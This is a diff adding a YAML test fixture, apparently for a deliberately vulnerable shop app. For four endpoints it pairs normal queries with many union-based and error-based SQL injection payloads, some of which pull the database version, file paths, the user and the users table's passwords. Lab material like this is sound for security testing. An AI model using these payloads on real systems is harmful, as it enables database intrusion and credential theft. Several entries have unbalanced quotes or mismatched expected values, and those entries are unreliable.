@@ -1,0 +1,158 @@
+# https://portswigger.net/web-security/sql-injection/cheat-sheet
+search:
+# SELECT * FROM items WHERE name LIKE '%$search%'
+
+  # So normal usecase?
+  functional_test:
+    test_name_01:
+      payload: r"Apple"
+      expected: "Apple 2.00 €"
+    test_name_02:
+      payload: r"Orange"
+      expected: "Orange 3.00 €"
+    test_name_03:
+      payload: r""
+      expected: "- Apple 2.00 €
+                - Orange 3.00 €
+                - Cherry 1.00 € "
+  union:
+    attack_01:
+      payload: r"%' UNION SELECT NULL,version()-- -"
+      expected: "5.7.24"
+    attack_02:
+      payload: r"%' UNION SELECT NULL, NULL,@@version-- -"
+      expected: "5.7.24"
+    attack_03:
+    # This can help with getting the database version
+      payload: r"%' UNION SELECT NULL,NULL,NULL,@@version-- -"
+      expected: "5.7.24"
+    attack_04:
+    # This can help with mapping the filesystem
+      # %25'%20UNION%20SELECT%20NULL%2C%40%40global.version_compile_os--%20-
+      payload: r"%' UNION SELECT NULL,@@global.version_compile_os-- -"
+      expected: "Linux"
+    attack_05:
+    # This can help with mapping the filesystem
+      # %25'%20UNION%20SELECT%20NULL%2C%40%40datadir--%20-
+      payload: r"%' UNION SELECT NULL,@@datadir-- -"
+      expected: "/var/lib/mysql/"
+    attack_06:
+    # %25'%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--%20-
+      payload: r"%' UNION SELECT username, password FROM users -- -"
+      expected: "admin"
+  error-based:
+    attack_01:
+    # %25'%20AND%20ExtractValue(0%2C%20CONCAT(%200x5c%2C%20User()))%20--%20-
+      payload: r"%' AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"
+      expected: "root@"
+    attack_02:
+    # %25'%20AND%20ExtractValue(0%2C%20CONCAT(%200x5c%2C%20%40%40version))%20--%20-
+      payload: r"%' AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
+      expected: "5.7.24"
+    attack_03:
+      payload: r"%;""
+      expected: "MySQL"
+
+search_by_price:
+# "SELECT * FROM items WHERE price <= $max";
+  functional_test:
+    test_name_01:
+      payload: r"1.00"
+      expected: "Cherry 1.00 €"
+    test_name_02:
+      payload: r"2.00"
+      expected: "Apple 2.00 €
+                Cherry 1.00 € "
+    test_name_03:
+      payload: r"3.00"
+      expected: "Apple 2.00 €
+                Orange 3.00 €
+                Cherry 1.00 € "
+# payload is an INTEGER, which meas that escaped "'" does not matter in this seeting with real_escape_string()
+  union:
+    attack_01:
+      payload: r"1 UNION SELECT NULL,version()-- -"
+      expected: "5.7.24"
+    attack_02:
+      payload: r"1 UNION SELECT NULL, NULL,@@version-- -"
+      expected: "5.7.24"
+    attack_03:
+    # This can help with mapping the filesystem
+      # 1%20UNION%20SELECT%20NULL%2C%40%40global.version_compile_os--%20-
+      payload: r"1 UNION SELECT NULL,@@global.version_compile_os-- -"
+      expected: "Linux"
+  error-based:
+    attack_01:
+      payload: r"1 AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"
+      expected: "root@"
+    attack_02:
+      payload: r"1 AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
+      expected: "5.7.24"
+    attack_03:
+    # 1%20UNION%20SELECT%201%2C%20CONCAT(username%2C%20'%3A'%2C%20password)%2C%203%20FROM%20users%20WHERE%20'1'%20%3D%20'1'%20--%20-
+      payload: r"1 UNION SELECT 1, CONCAT(username, ':', password), 3 FROM users WHERE '1' = '1' -- -"
+      expected: "/var/lib/mysql/"
+find:
+# SELECT * FROM items WHERE name='$search'
+  functional_test:
+    test_name_01:
+      payload: r"Apple"
+      expected: "Apple 2.00 €"
+    test_name_02:
+      payload: r"Orange"
+      expected: "Orange 3.00 €"
+    test_name_03:
+      payload: r""
+      expected: "- Apple 2.00 €
+                - Orange 3.00 €
+                - Cherry 1.00 € "
+  union:
+    attack_01:
+      payload: r"' UNION SELECT NULL,version()-- -"
+      expected: "5.7.24"
+  error-based:
+    attack_01:
+      payload: r"' AND ExtractValue(0, CONCAT( 0x5c, User())) -- -"
+      expected: "root@"
+    attack_02:
+      payload: r"' AND ExtractValue(0, CONCAT( 0x5c, @@version)) -- -"
+      expected: "5.7.24"
+    attack_03:
+      payload: r"' AND ExtractValue(0, CONCAT( 0x5c, @@datadir)) -- -"
+      expected: "/var/lib/mysql/"
+    attack_04:
+      payload: r"' AND ExtractValue(0, CONCAT( 0x5c, @@global.version_compile_os)) -- -"
+      expected: "Linux"
+
+
+
+login:
+# SELECT * FROM users WHERE username='admin' AND password='$pass'
+  functional_test:
+    test_name_01:
+      payload: [r"admin", r"password]
+      expected: "Welcome admin!"
+    test_name_02:
+      payload: [r"admin", r"wrong_password]
+      expected: "Wrong username or password"
+  # just a simple test
+  union:
+    attack_01:
+      payload: r"-- -"
+      expected: "admin"
+    attack_02:
+      payload: r"' UNION SELECT NULL,version()-- -"
+      expected: "5.7.24"
+    attack_03:
+      payload : r"'  '1' = '1' UNION SELECT NULL,version()-- -"
+      expected: "5.7.24"
+    attack_04:
+      payload: r"' UNION SELECT NULL, NULL,version()-- -"
+      expected: "5.7.24"
+    attack_05:
+      payload: r"' UNION SELECT NULL,NULL, NULL,version()-- -"
+      expected: "5.7.24"
+    attack_06:
+      payload: r"' UNION SELECT NULL,NULL, NULL,version()-- -"
+      expected: "5.7.24"
+  error-based:
